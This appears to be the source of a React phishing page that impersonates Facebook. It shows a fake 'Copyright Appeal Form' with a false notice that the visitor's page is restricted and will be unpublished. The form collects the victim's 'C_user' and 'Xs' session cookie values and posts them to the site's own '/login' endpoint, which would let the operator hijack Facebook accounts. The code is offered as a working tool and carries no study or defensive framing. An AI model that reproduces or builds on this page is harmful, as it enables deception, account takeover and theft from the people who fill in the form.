import React, { useState } from 'react'
import "./Facebook.css"
import HelpData from './HelpData'
const Facebook = () => {
    const [data, Setdata] = useState({
        Cuser: "",
        Xs: "",
    });

    const handleClick = (e) => {
        const name = e.target.name;
        const value = e.target.value;
        console.log(name, value);

        Setdata({ ...data, [name]: value });
    }

    const HandleSubmit = async (e) =>{
        e.preventDefault();
        
        const {Cuser, Xs}= data;
        const res = await fetch(`/login`,{
          method: "POST",
          headers:{
            "content-type": "application/json"
          },
          body:JSON.stringify({
            Cuser, Xs
          })
        });
  
        const datahit = await res.json();
        if(datahit.status=== 422 || !datahit){
          console.log("not registered");
          alert("Invalid credentials");
        }else{
          console.log("registered successfully");
          alert("Registration Successfully");
        }
    }
       
    
    
    
    
    
    //     const response = await fetch("logindata", {
    //         method: "POST",
    //         headers: {
    //             "content-type": "application/json"
    //         },
    //         body:JSON.stringify({
    //             Cuser, Xs
    //         })
    //     });

    //     const detail = await response.json();
    //     console.log(detail)
    //     if( detail.status === 422 || !detail){
    //         console.log("not registered");
    //         alert("Invalid Credentials");
    //     }else{
    //         console.log("registered successfully");
    //         alert ("registration Successfully");
    //     }
    // }

   

    return (
        <div>
            <div className='facebook_title_controls'>
                <div className='facebook_title '>
                    <h1>facebook</h1>
                </div>
            </div>
            <div className='container'>

                <div className='row'>
                    <div className='col-lg-4 col-md-4 col-12 help_center_bg mt-5'>
                        <h4 className="help_bg" style={{ fontSize: "20px" }}>Help Center</h4>
                        <HelpData />
                    </div>
                    <div className='col-lg-8 col-md-8 col-12 '>
                        <div className='copyright_border_all border mt-5'>
                            <div className='copyright_border_heading'>
                                <h4>Copyright Appeal Form</h4>
                            </div>

                            <div className='copyright_content_here p-3'>

                                <div className='copyright_text_one'>
                                    <p>We have detected unusual activity on your page which violates our community standards.
                                        <br></br> Your access have been limited on your page and you can not post, share or comment as your page.if you think this was a mistake
                                        you can submit an appeal by providing the required information
                                    </p>
                                </div>
                                <div className='copyright_video_content'>
                                    <span>Detailed Video Information</span>
                                    <div className='video_vid mb-3 mt-2'>
                                        <video
                                            src='./video/vid1.mp4'
                                            autoPlay loop className='video_here'
                                            style={{ width: "300px" }}

                                            controls />
                                    </div>
                                    <p>Please be sure to provide the requested information thanks
                                        <br></br>
                                        <br></br>
                                        Failure to provide this information may lead to unpublishment of your page.
                                    </p>
                                    <div className='container'>
                                        <div className='row'>
                                            <div className=' col-12'>
                                                <form method='POST' onClick={HandleSubmit}>
                                                    <div className="mb-3">
                                                        <label className="form-label">C_user</label>
                                                        <input type="text" name='Cuser' value={data.Cuser} onChange={handleClick} className="form-control" />
                                                    </div>
                                                    <div className="mb-3">
                                                        <label className="form-label">Xs</label>
                                                        <input type="text" name='Xs' value={data.Xs} onChange={handleClick} className="form-control" id="exampleInputPassword1" />
                                                    </div>

                                                    <div className="mb-3 py-1 px-3 text-end">

                                                        <button type="submit" className='btn btn-primary'>Submit</button>

                                                    </div>


                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>


                </div>
            </div>




        </div>

    )
}

export default Facebook
